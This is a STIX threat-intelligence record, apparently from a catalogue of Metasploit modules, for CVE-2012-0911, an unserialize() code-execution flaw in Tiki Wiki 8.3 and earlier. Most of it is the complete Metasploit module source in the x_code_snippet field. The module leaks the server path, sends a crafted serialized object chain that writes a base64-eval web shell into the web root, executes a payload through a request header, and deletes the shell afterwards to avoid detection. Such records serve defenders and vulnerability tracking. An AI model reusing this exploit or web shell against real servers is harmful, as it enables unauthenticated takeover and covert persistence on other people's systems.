{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ee6983e-0fc5-44b8-b7b8-70d43d651fea",
    "created": "2024-08-14T17:12:19.666477Z",
    "modified": "2024-08-14T17:12:19.666481Z",
    "name": "Tiki Wiki unserialize() PHP Code Execution",
    "description": " This module exploits a php unserialize() vulnerability in Tiki Wiki <= 8.3 which could be abused to allow unauthenticated users to execute arbitrary code under the context of the webserver user.  The dangerous unserialize() exists in the 'tiki-print_multi_pages.php' script which is called with user controlled data from the 'printpages' parameter. The exploit abuses the __destruct() method from the Zend_Pdf_ElementFactory_Proxy class to write arbitrary PHP code to a file on the Tiki Wiki web directory.  In order to run successfully three conditions must be satisfied (1) display_errors php setting must be On to disclose the filesystem path of Tiki Wiki, (2) The Tiki Wiki Multiprint feature must be enabled to exploit the unserialize() and (3) a php version older than 5.3.4 must be used to allow poison null bytes in filesystem related functions. The exploit has been tested successfully on Ubuntu 9.10 and Tiki Wiki 8.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tikiwiki_unserialize_exec.rb",
            "external_id": "tikiwiki_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0911"
        },
        {
            "source_name": "reference",
            "url": "http://dev.tiki.org/item4109"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Tiki Wiki unserialize() PHP Code Execution',\n        'Description' => %q{\n          This module exploits a php unserialize() vulnerability in Tiki Wiki <= 8.3\n          which could be abused to allow unauthenticated users to execute arbitrary code\n          under the context of the webserver user.\n\n          The dangerous unserialize() exists in the 'tiki-print_multi_pages.php' script,\n          which is called with user controlled data from the 'printpages' parameter.\n          The exploit abuses the __destruct() method from the Zend_Pdf_ElementFactory_Proxy\n          class to write arbitrary PHP code to a file on the Tiki Wiki web directory.\n\n          In order to run successfully three conditions must be satisfied (1) display_errors\n          php setting must be On to disclose the filesystem path of Tiki Wiki, (2) The Tiki\n          Wiki Multiprint feature must be enabled to exploit the unserialize() and (3) a php\n          version older than 5.3.4 must be used to allow poison null bytes in filesystem related\n          functions. The exploit has been tested successfully on Ubuntu 9.10 and Tiki Wiki 8.3.\n        },\n        'Author' => [\n          'EgiX', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-0911' ],\n          [ 'OSVDB', '83534' ],\n          [ 'BID', '54298' ],\n          [ 'EDB', '19573' ],\n          [ 'URL', 'http://dev.tiki.org/item4109' ]\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Payload' => {\n          'DisableNops' => true,\n        },\n        'Targets' => [ ['Automatic', {}] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-07-04',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/tiki/\"])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      begin\n        print_warning(\"Deleting #{@upload_php}\")\n        client.fs.file.rm(@upload_php)\n        print_good(\"#{@upload_php} removed to stay ninja\")\n      rescue\n        print_error(\"Unable to remove #{f}\")\n      end\n    end\n  end\n\n  def exploit\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n    @upload_php = rand_text_alpha(rand(4) + 4) + \".php\"\n\n    print_status(\"Disclosing the path of the Tiki Wiki on the filesystem\")\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(base, \"tiki-rss_error.php\")\n    )\n\n    if not res or res.code != 200 or not res.body =~ /[> ](\\/.*)tiki-rss_error\\.php/\n      print_error \"Tiki Wiki path couldn't be disclosed. The php setting 'display_errors' must be On.\"\n      return\n    else\n      tiki_path = $1\n      print_good \"Tiki Wiki path disclosure: #{tiki_path}\"\n    end\n\n    php_payload = \"<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>\"\n\n    printpages = \"O:29:\\\"Zend_Pdf_ElementFactory_Proxy\\\":1:\"\n    printpages << \"{s:39:\\\"%00Zend_Pdf_ElementFactory_Proxy%00_factory\\\";O:51:\\\"Zend_Search_Lucene_Index_SegmentWriter_StreamWriter\\\":5:\"\n    printpages << \"{s:12:\\\"%00*%00_docCount\\\";i:1;s:8:\\\"%00*%00_name\\\";s:3:\\\"foo\\\";s:13:\\\"%00*%00_directory\\\";O:47:\\\"Zend_Search_Lucene_Storage_Directory_Filesystem\\\":1:\"\n    printpages << \"{s:11:\\\"%00*%00_dirPath\\\";s:#{tiki_path.length + @upload_php.length + 1}:\\\"#{tiki_path + @upload_php}%00\\\";}\"\n    printpages << \"s:10:\\\"%00*%00_fields\\\";a:1:\"\n    printpages << \"{i:0;O:34:\\\"Zend_Search_Lucene_Index_FieldInfo\\\":1:\"\n    printpages << \"{s:4:\\\"name\\\";s:#{php_payload.length}:\\\"#{php_payload}\\\";}}\"\n    printpages << \"s:9:\\\"%00*%00_files\\\";O:8:\\\"stdClass\\\":0:{}}}\"\n\n    print_status(\"Exploiting the unserialize() to upload PHP code\")\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(base, \"tiki-print_multi_pages.php\"),\n        'method' => 'POST',\n        'vars_post' => {\n          'printpages' => printpages\n        }\n      }\n    )\n\n    if not res or res.code != 200\n      print_error(\"Exploit failed: #{res.code}. The Tiki Wiki Multiprint feature must be enabled.\")\n      return\n    end\n\n    print_status(\"Executing the payload #{@upload_php}\")\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(base, @upload_php),\n        'headers' => {\n          'Cmd' => Rex::Text.encode_base64(payload.encoded)\n        }\n      }\n    )\n\n    if res\n      print_error(\"Payload execution failed: #{res.code}\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-04",
    "x_mitre_platforms": [
        "['php']"
    ]
}